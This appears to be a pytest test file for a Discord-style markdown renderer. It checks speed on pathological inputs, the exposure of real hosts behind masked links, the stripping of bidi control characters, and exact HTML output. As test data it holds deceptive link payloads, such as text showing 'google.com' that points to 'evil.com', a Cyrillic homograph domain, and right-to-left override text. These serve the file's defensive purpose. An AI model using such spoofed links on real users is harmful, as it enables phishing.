        "[" * 10_000,
        "[a](" * 2_500,
        "`" * 10_000,
        "*a " * 3_000,
        "||a " * 2_500,
        "<" * 10_000,
        "<:a:1>" * 2_000,
        "https://x.com/" + "a" * 10_000,
        "a\n" * 5_000,
    ],
    ids=lambda payload: f"{payload[:8]!r}x{len(payload)}",
)
def test_pathological_input_is_fast_and_safe(payload: str) -> None:
    start = time.perf_counter()
    html = str(render(payload))
    # ~2.5x Discord's 4,000 character limit; real renders take tens of ms.
    assert time.perf_counter() - start < 1
    assert_safe(html)


def test_discord_syntax_still_renders() -> None:
    html = str(render("**b** *i* __u__ ~~s~~ ||sp|| `c` [l](https://x.com)"))
    assert "<strong>b</strong>" in html
    assert "<em>i</em>" in html
    assert "<u>u</u>" in html
    assert "<del>s</del>" in html
    assert '<span class="dc-spoiler" tabindex="0">sp</span>' in html
    assert '<code class="dc-code">c</code>' in html
    assert 'href="https://x.com"' in html


@pytest.mark.parametrize(
    ("payload", "host"),
    [
        ("[https://google.com](https://evil.com)", "evil.com"),
        ("[google.com/login](https://evil.com)", "evil.com"),
        ("[a](https://\u0440\u0430\u0443\u0440\u0430l.com)", "xn--l-7sba6dbr.com"),
    ],
)
def test_masked_link_shows_real_host(payload: str, host: str) -> None:
    html = str(render(payload))
    assert f'<span class="dc-link-host">({host})</span>' in html
    assert html.count("<a ") == 1


@pytest.mark.parametrize(
    "payload", ["https://x.com", "<https://x.com>", "[https://x.com](https://x.com)"]
)
def test_plain_link_has_no_host_suffix(payload: str) -> None:
    assert "dc-link-host" not in str(render(payload))


@pytest.mark.parametrize(
    "label", ["", " ", "\u200b", "\u3164", "\u2800", "\u0300", "\u115f\u1160"]
)
def test_invisible_link_label_shows_url(label: str) -> None:
    assert ">https://x.com</a>" in str(render(f"[{label}](https://x.com)"))


def test_bidi_controls_stripped() -> None:
    assert "\u202e" not in str(render("\u202ehttps://evil.com \u2066x\u2069"))


@pytest.mark.parametrize(
    ("payload", "expected"),
    [
        (
            "> q\nnot quote",
            '<blockquote class="dc-quote"><p>q</p></blockquote><p>not quote</p>',
        ),
        ("> > nested", '<blockquote class="dc-quote"><p>&gt; nested</p></blockquote>'),
        (">>> a\nb", '<blockquote class="dc-quote"><p>a\nb</p></blockquote>'),
        (">no space", "<p>&gt;no space</p>"),
        ("# h", '<p class="dc-h1">h</p>'),
        ("#### h", "<p>#### h</p>"),
        ("# ", "<p>#</p>"),
        ("# a #", '<p class="dc-h1">a #</p>'),
        ("## a ##", '<p class="dc-h2">a ##</p>'),
        ("___x___", "<p><u><em>x</em></u></p>"),
        ("__x__", "<p><u>x</u></p>"),
        ("__init__.py", "<p><u>init</u>.py</p>"),
        ("   # h", "<p># h</p>"),
        ("-", "<p>-</p>"),
        ("+ x", "<p>+ x</p>"),
        ("1) x", "<p>1) x</p>"),
        ("a     b\nc", "<p>a     b\nc</p>"),
        (
            "a\n\n\nb",
            '<p>a</p><span class="dc-gap"></span><span class="dc-gap"></span><p>b</p>',
        ),
        ("x\r\ny\rz", "<p>x\ny\nz</p>"),
        (
            "<@1> <#2> @everyone",
            '<p><span class="dc-mention"><bdi>@1</bdi></span> <span class="dc-mention"><bdi>#2</bdi></span> <span class="dc-mention"><bdi>@everyone</bdi></span></p>',
        ),
        ("<t:99999999999999:R>", "<p>&lt;t:99999999999999:R&gt;</p>"),
    ],
)
def test_matches_discord(payload: str, expected: str) -> None:
    assert str(render(payload)) == expected


def test_timestamp_and_emoji() -> None:
    html = str(render("<t:1700000000:R> <a:dance:456>"))
    assert 'data-dc-ts="1700000000"' in html
    assert 'data-dc-style="R">14 Nov 2023, 22:13 UTC</time>' in html
    assert 'src="https://cdn.discordapp.com/emojis/456.gif?size=48" alt=":dance:"' in html
